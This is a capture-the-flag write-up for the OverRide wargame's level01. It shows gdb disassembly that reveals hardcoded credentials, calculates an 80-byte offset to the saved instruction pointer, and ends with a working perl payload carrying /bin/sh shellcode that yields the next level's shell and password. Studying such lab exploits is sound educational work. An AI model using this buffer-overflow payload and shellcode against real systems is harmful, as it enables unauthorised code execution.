# level01

The program reads username and password from stdin and always prints incorrect password.

## Step 1. Find the right username and password
```assembly
level01@OverRide:~$ gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble verify_user_name" level01
[...]
   0x0804847d <+25>:	mov    eax,0x80486a8
   0x08048482 <+30>:	mov    ecx,0x7
   0x08048487 <+35>:	mov    esi,edx
   0x08048489 <+37>:	mov    edi,eax
   0x0804848b <+39>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
[...]
level01@OverRide:~$ gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble verify_user_pass" level01
[...]
   0x080484ad <+10>:	mov    eax,0x80486b0
   0x080484b2 <+15>:	mov    ecx,0x5
   0x080484b7 <+20>:	mov    esi,edx
   0x080484b9 <+22>:	mov    edi,eax
   0x080484bb <+24>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
[...]
```
By disassembling these two verification function, we found the address of username and password.

```
level01@OverRide:~$ gdb -batch -ex "x/s 0x80486a8" level01
0x80486a8:	 "dat_wil"
level01@OverRide:~$ gdb -batch -ex "x/s 0x80486b0" level01
0x80486b0:	 "admin"
```
By inspecting the address of string literal, we got the username `dat_wil` and password `admin`.

```
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
admin
nope, incorrect password...
```
The username is correct, but we couldn't login.

## Step 2. Calculate offset to overwrite `eip`
```assembly
level01@OverRide:~$ gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble main" level01
[...]
   0x0804856d <+157>:	lea    eax,[esp+0x1c]
   0x08048571 <+161>:	mov    DWORD PTR [esp],eax
=> 0x08048574 <+164>:	call   0x8048370 <fgets@plt>
   0x08048579 <+169>:	lea    eax,[esp+0x1c]
   0x0804857d <+173>:	mov    DWORD PTR [esp],eax
   0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
[...]
```
```
level01@OverRide:~$ gdb -q level01
Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.
(gdb) break *0x08048574
Breakpoint 1 at 0x8048574
(gdb) run
Starting program: /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:

Breakpoint 1, 0x08048574 in main ()
(gdb) info registers eax
eax            0xffffd6bc	-10564
(gdb) info frame
Stack level 0, frame at 0xffffd710:
 eip = 0x8048574 in main; saved eip 0xf7e45513
 Arglist at 0xffffd708, args:
 Locals at 0xffffd708, Previous frame's sp is 0xffffd710
 Saved registers:
  ebx at 0xffffd700, ebp at 0xffffd708, edi at 0xffffd704, eip at 0xffffd70c
(gdb) print 0xffffd70c - 0xffffd6bc
$1 = 80
```
The username buffer is a global variable, we cannot use it to overwrite eip. We set a breakpoint before calling function `fgets`, then got offset `80` by calculating `eip - eax`.

## Step 3. Find a place to inject shellcode
```
level01@OverRide:~$ objdump -j .bss -d level01
[...]
0804a040 <a_user_name>:
```
`0x0804a040` is the address of global variable `a_user_name` which stores input username, we concatenate [shellcode](http://shell-storm.org/shellcode/files/shellcode-219.php) after the username `dat_wil` then use the address `0x0804a040 + 0x7` to access it.

## Step 4. Build payload
```
level01@OverRide:~$ perl -e 'print "dat_wil\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80\n" . "A"x80 . pack("V", 0x804a047)' | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

$ whoami
level02
$ cat /home/users/$(whoami)/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
